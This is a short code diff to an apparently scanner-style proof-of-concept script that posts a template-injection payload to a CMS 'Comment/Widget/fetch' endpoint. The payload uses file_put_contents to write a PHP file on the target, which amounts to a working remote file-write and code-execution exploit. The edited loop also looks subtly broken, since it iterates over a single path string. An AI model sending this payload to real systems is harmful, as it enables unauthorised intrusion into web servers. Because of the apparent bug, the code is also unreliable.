@@ -22,12 +22,8 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, './'):
                     url = path + "index.php?g=Comment&m=Widget&a=fetch"
                     _data = "templateFile=/../public/index&prefix=''&content=<php>file_put_contents('bytestforme1.php','<?php phpinfo();')</php>"
                     async with session.post(url=url, data=_data) as res:
